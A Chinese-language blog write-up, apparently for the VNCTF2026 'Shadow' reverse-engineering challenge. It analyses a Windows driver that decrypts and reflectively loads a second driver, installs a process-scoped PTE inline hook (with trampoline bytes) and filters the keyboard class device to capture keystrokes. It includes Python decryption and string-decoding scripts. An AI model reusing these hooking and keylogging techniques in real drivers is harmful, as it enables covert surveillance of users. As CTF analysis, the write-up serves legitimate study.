<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>VNCTF2026 Shadow分析[驱动分析+反射注入] | Matriy's blog</title><meta name="author" content="Matriy"><meta name="copyright" content="Matriy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="ShadowVNCTF2026-Shadow-WP | Liv’s blog Maze.exe一个简单迷宫 sys分析下  Findcrypt发现AES sub_14000C000从全局 Pool 拷贝 0x5E00 字节，然后调用 sub_140001168 做 16 字节分组变换 确认是 AES 轮函数（S-box 在 0x140004000，Rcon 在 0x140003070，密钥在 dw">
<meta property="og:type" content="article">
<meta property="og:title" content="VNCTF2026 Shadow分析[驱动分析+反射注入]">
<meta property="og:url" content="http://matriy330.github.io/fe2f4500/index.html">
<meta property="og:site_name" content="Matriy&#39;s blog">
<meta property="og:description" content="ShadowVNCTF2026-Shadow-WP | Liv’s blog Maze.exe一个简单迷宫 sys分析下  Findcrypt发现AES sub_14000C000从全局 Pool 拷贝 0x5E00 字节，然后调用 sub_140001168 做 16 字节分组变换 确认是 AES 轮函数（S-box 在 0x140004000，Rcon 在 0x140003070，密钥在 dw">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://matriy330.github.io/img/tx.jpg">
<meta property="article:published_time" content="2026-02-23T14:29:34.000Z">
<meta property="article:modified_time" content="2026-02-23T14:29:47.560Z">
<meta property="article:author" content="Matriy">
<meta property="article:tag" content="Re">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://matriy330.github.io/img/tx.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "VNCTF2026 Shadow分析[驱动分析+反射注入]",
  "url": "http://matriy330.github.io/fe2f4500/",
  "image": "http://matriy330.github.io/img/tx.jpg",
  "datePublished": "2026-02-23T14:29:34.000Z",
  "dateModified": "2026-02-23T14:29:47.560Z",
  "author": [
    {
      "@type": "Person",
      "name": "Matriy",
      "url": "http://matriy330.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/bitbug_favicon.ico"><link rel="canonical" href="http://matriy330.github.io/fe2f4500/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="G-ShTqjjywiLkL87Rg0PaiSsDVYymWStdQUO1wrM_VY"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"WNU3SCXSZI","apiKey":"52cb4202156099aebcec0f96e4b18d7c","indexName":"blog","hitsPerPage":6,"languages":{"input_placeholder":"搜索文章","hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，耗时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":30,"languages":{"author":"作者: Matriy","link":"链接: ","source":"来源: Matriy's blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}
</script><link rel="stylesheet" href="/css/custom.css"><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'VNCTF2026 Shadow分析[驱动分析+反射注入]',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/cursor.css"><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/comment.css"><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Matriy's blog" type="application/atom+xml">
</head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg" style="background-image: url(/img/bg.jpeg);"></div><div id="an_music_bg" style="background-image: url(/img/bg.jpeg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">256</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Matriy's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">VNCTF2026 Shadow分析[驱动分析+反射注入]</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">VNCTF2026 Shadow分析[驱动分析+反射注入]</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-23T14:29:34.000Z" title="发表于 2026-02-23 22:29:34">2026-02-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-23T14:29:47.560Z" title="更新于 2026-02-23 22:29:47">2026-02-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Re/">Re</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">12.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>51分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/fe2f4500/#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Shadow"><a href="#Shadow" class="headerlink" title="Shadow"></a>Shadow</h1><p><a target="_blank" rel="noopener" href="https://tkazer.github.io/2026/02/02/VNCTF2026-Shadow-WP/">VNCTF2026-Shadow-WP | Liv’s blog</a></p>
<p>Maze.exe一个简单迷宫</p>
<p>sys分析下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260215233212444.png" alt="image-20260215233212444"></p>
<p>Findcrypt发现AES</p>
<p>sub_14000C000从全局 Pool 拷贝 0x5E00 字节，然后调用 sub_140001168 做 16 字节分组变换</p>
<p>确认是 AES 轮函数（S-box 在 0x140004000，Rcon 在 0x140003070，密钥在 dword_14000A000）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260215233457807.png" alt="image-20260215233457807"></p>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>AI搓个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># Challenge-specific RVAs from stage1 sys.</span></span><br><span class="line">KEY_RVA = <span class="number">0xA000</span></span><br><span class="line">ENC_BLOB_RVA = <span class="number">0x4200</span></span><br><span class="line">ENC_BLOB_SIZE = <span class="number">0x5E00</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_rva_bytes</span>(<span class="params">pe: pefile.PE, rva: <span class="built_in">int</span>, size: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    offset = pe.get_offset_from_rva(rva)</span><br><span class="line">    data = pe.__data__[offset : offset + size]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) != size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;read size mismatch @RVA <span class="subst">&#123;<span class="built_in">hex</span>(rva)&#125;</span>: got <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span>, want <span class="subst">&#123;size&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_pe_image</span>(<span class="params">buf: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(buf) &lt; <span class="number">0x40</span> <span class="keyword">or</span> buf[:<span class="number">2</span>] != <span class="string">b&quot;MZ&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    e_lfanew = <span class="built_in">int</span>.from_bytes(buf[<span class="number">0x3C</span>:<span class="number">0x40</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> e_lfanew + <span class="number">4</span> &lt;= <span class="built_in">len</span>(buf) <span class="keyword">and</span> buf[e_lfanew : e_lfanew + <span class="number">4</span>] == <span class="string">b&quot;PE\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Recover stage2 PE directly from stage1 .sys&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;sys_path&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;path to stage1 driver (.sys)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--out&quot;</span>, default=<span class="string">&quot;./stage2_driver.bin&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;output stage2 file&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    pe = pefile.PE(args.sys_path, fast_load=<span class="literal">False</span>)</span><br><span class="line">    key = read_rva_bytes(pe, KEY_RVA, <span class="number">16</span>)</span><br><span class="line">    enc_blob = read_rva_bytes(pe, ENC_BLOB_RVA, ENC_BLOB_SIZE)</span><br><span class="line"></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    cand_encrypt = cipher.encrypt(enc_blob)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(args.out, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(cand_encrypt)</span><br><span class="line"></span><br><span class="line">    e_lfanew = <span class="built_in">int</span>.from_bytes(cand_encrypt[<span class="number">0x3C</span>:<span class="number">0x40</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(cand_encrypt[:<span class="number">2</span>], cand_encrypt[e_lfanew : e_lfanew + <span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解密PE文件后，进行PE拉伸、重定位修复、IAT修复、调用DriverEntry，一系列操作进行手动加载该PE文件到内存中运行，具体实现原理可以网上搜”反射注入”，实际就是手动实现加载并运行程序。from liv</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260218220159318.png" alt="image-20260218220159318"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260218220229531.png" alt="image-20260218220229531"></p>
</blockquote>
<p>关注sub_140001C10函数</p>
<p>sub_140001C10中有个解码字符串函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260218225543154.png" alt="image-20260218225543154"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_obf</span>(<span class="params">data, key</span>):</span><br><span class="line">    b = <span class="built_in">bytearray</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">        b[i] ^= ((i % <span class="number">0x0D</span>) + key) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(b)</span><br><span class="line"></span><br><span class="line">arr1 = [</span><br><span class="line">    <span class="number">0xF1</span>,<span class="number">0xBB</span>,<span class="number">0xD9</span>,<span class="number">0xBD</span>,<span class="number">0xFA</span>,<span class="number">0xBF</span>,<span class="number">0xA5</span>,<span class="number">0xC1</span>,<span class="number">0xAE</span>,<span class="number">0xC3</span>,<span class="number">0xA5</span>,<span class="number">0xC5</span>,<span class="number">0xBF</span>,<span class="number">0xBA</span>,<span class="number">0xFE</span>,<span class="number">0xBC</span>,</span><br><span class="line">    <span class="number">0xC5</span>,<span class="number">0xBE</span>,<span class="number">0xDA</span>,<span class="number">0xC0</span>,<span class="number">0xA2</span>,<span class="number">0xC2</span>,<span class="number">0xB6</span>,<span class="number">0xC4</span>,<span class="number">0xB1</span>,<span class="number">0xC6</span>,<span class="number">0xD3</span>,<span class="number">0xBB</span>,<span class="number">0xD3</span>,<span class="number">0xBD</span>,<span class="number">0xD0</span>,<span class="number">0xBF</span>,</span><br><span class="line">    <span class="number">0x94</span>,<span class="number">0xC1</span>,<span class="number">0xAA</span>,<span class="number">0xC3</span>,<span class="number">0xB6</span>,<span class="number">0xC5</span>,<span class="number">0xA3</span>,<span class="number">0xBA</span>,<span class="number">0xDA</span>,<span class="number">0xBC</span>,<span class="number">0xD9</span>,<span class="number">0xBE</span>,<span class="number">0xBF</span>,<span class="number">0xC0</span></span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(decode_obf(arr1, <span class="number">0xBA</span>).decode(<span class="string">&quot;utf-16le&quot;</span>).rstrip(<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">arr2 = [</span><br><span class="line">    <span class="number">0xCC</span>,<span class="number">0x91</span>,<span class="number">0xD6</span>,<span class="number">0x93</span>,<span class="number">0xF1</span>,<span class="number">0x95</span>,<span class="number">0xE0</span>,<span class="number">0x97</span>,<span class="number">0xF1</span>,<span class="number">0x99</span>,<span class="number">0xF9</span>,<span class="number">0x9B</span>,<span class="number">0xF9</span>,<span class="number">0x90</span>,<span class="number">0xCD</span>,<span class="number">0x92</span>,</span><br><span class="line">    <span class="number">0xD8</span>,<span class="number">0x94</span>,<span class="number">0xF0</span>,<span class="number">0x96</span>,<span class="number">0xEE</span>,<span class="number">0x98</span>,<span class="number">0xFB</span>,<span class="number">0x9A</span>,<span class="number">0xF4</span>,<span class="number">0x9C</span>,<span class="number">0xF1</span>,<span class="number">0x91</span>,<span class="number">0xE0</span>,<span class="number">0x93</span>,<span class="number">0xF0</span>,<span class="number">0x95</span>,</span><br><span class="line">    <span class="number">0xD5</span>,<span class="number">0x97</span>,<span class="number">0xF4</span>,<span class="number">0x99</span>,<span class="number">0xFB</span>,<span class="number">0x9B</span>,<span class="number">0xEF</span>,<span class="number">0x90</span>,<span class="number">0xE2</span>,<span class="number">0x92</span>,<span class="number">0xA3</span>,<span class="number">0x94</span>,<span class="number">0x95</span>,<span class="number">0x96</span></span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(decode_obf(arr2, <span class="number">0x90</span>).decode(<span class="string">&quot;utf-16le&quot;</span>).rstrip(<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>在 sub_140001C10 中解码出两个关键字符串：</p>
<ul>
<li>KeDelayExecutionThread</li>
<li>\Device\KeyboardClass0</li>
</ul>
<p>0x61004D 的内存字节是：4D 00 61 00 -&gt; UTF-16LE 就是 “M” “a”</p>
<p>0x65007A 的内存字节是：7A 00 65 00 -&gt; UTF-16LE 就是 “z” “e”</p>
<p>枚举 PID 12..0xFFFFF，通过 SeLocateProcessImageName 找进程名为 Maze（比较 M a z e）。</p>
<p>SystemRoutineAddress &#x3D; MmGetSystemRoutineAddress(&amp;DestinationString);</p>
<blockquote>
<p>在内核里按名字查找 KeDelayExecutionThread 这个系统例程的地址</p>
<p><code>MmGetSystemRoutineAddress</code> 是 Windows 内核提供的一个函数。</p>
<p>根据函数名字符串，返回该内核导出函数的地址。类似于用户态里的GetProcAddress</p>
<p>KeDelayExecutionThread 让当前线程延迟一段时间</p>
</blockquote>
<p>找到后调用 sub_140003F80 安装 hook；</p>
<ul>
<li>创建设备对象（IoCreateDevice，类型 0x0B &#x3D; 键盘）并 IoAttachDevice 到 \Device\KeyboardClass0。</li>
<li>MajorFunction 默认走 sub_1400010A0（直接转发）。</li>
<li>IRP_MJ_READ（索引 3）走 sub_140001100，设置 completion routine CompletionRoutine (0x1400017D0) 后转发。</li>
</ul>
<p>sub_140003F80 本质上是“安装内联 Hook + 建立可恢复上下文”的函数。在当前样本里它是给 KeDelayExecutionThread 装钩子（由 sub_140001C10 传进来）。</p>
<p>它主要做这几件事：</p>
<ol>
<li>PsLookupProcessByProcessId 拿到目标进程（Maze）的 PEPROCESS。</li>
<li>分配一个上下文结构（0xC0），调用 sub_140003B50 做页表相关准备（含保存原始页表项、必要时处理大页&#x2F;重映射）。</li>
<li>用 sub_140002470 从目标函数入口开始反汇编，累计到至少 14 字节（保证覆盖完整指令）。</li>
<li>保存原始前导字节，并构造 trampoline（原始字节 + 跳回 原函数+len），把 trampoline 指针写到 *a5。</li>
<li>构造 14 字节跳板并写回目标函数入口（sub_140003E80）：<br>FF 25 00 00 00 00 + 8字节hook地址（这里是 sub_1400012C0）。</li>
<li>把上下文挂到全局链表（供卸载时恢复），成功返回 1；任一步失败返回 0。</li>
</ol>
<blockquote>
<p>然后对该进程，进行对KeDelayExecutionThread函数单独隔离的Pte hook，Pte hook的特性就是对ntdll函数进行hook，但仅对该进程生效，hook替换成另一个函数。<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18999">PTE Hook：一种利用页表重映射攻击实现的内核函数Hook-先知社区</a></p>
</blockquote>
<p>键盘数据处理</p>
<p>IoAttachDevice(DeviceObject, &amp;TargetDevice, &amp;AttachedDevice)这说明它把自己挂到键盘类设备栈上，做键盘过滤</p>
<p>Sub_140001100 是这个驱动专门处理 IRP_MJ_READ（读请求）的分发函数，本质是带回调的转发器</p>
<blockquote>
<p>核心回调就是CompletionRoutine函数</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260218232308422.png" alt="image-20260218232308422"></p>
<p>返回缓冲按 KEYBOARD_INPUT_DATA 解析：count &#x3D; IoStatus.Information &#x2F; 0xC。</p>
<p>逐条读取扫描码 n0x54 和标志位：</p>
<ul>
<li>扫描码 0x2A&#x2F;0x36（左右 Shift）用于更新 byte_140006BA5（Shift 状态）。</li>
<li>只处理按下事件（Flags &amp; 1 &#x3D;&#x3D; 0），忽略松开事件。</li>
</ul>
<p>扫描码转字符：</p>
<ul>
<li>未按 Shift 用 byte_140005170。</li>
<li>按 Shift 用 byte_1400051D0。</li>
</ul>
<p>若转换出字符且采集开关 byte_140006BA4 为真，就写入 Source2[dword_140006BA8++]。</p>
<p>扫描码 0x58（F12）作为采集开关：</p>
<ul>
<li>打开时：清空 Source2 和长度，打印 “[LDriver] on input.\n”（字符串先解码）。</li>
<li>关闭时：打印 “[LDriver] input end.\n”（同样先解码）。</li>
</ul>
<blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260218232355910.png" alt="image-20260218232355910"></p>
</blockquote>
<p>交叉引用该函数可以到sub_1400012C0</p>
<p>分析逻辑可得解密代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import ida_bytes, ida_name</span><br><span class="line"></span><br><span class="line">out_path = r<span class="string">&quot;/tmp/sub_1400012C0_shellcode.bin&quot;</span></span><br><span class="line">parts = [</span><br><span 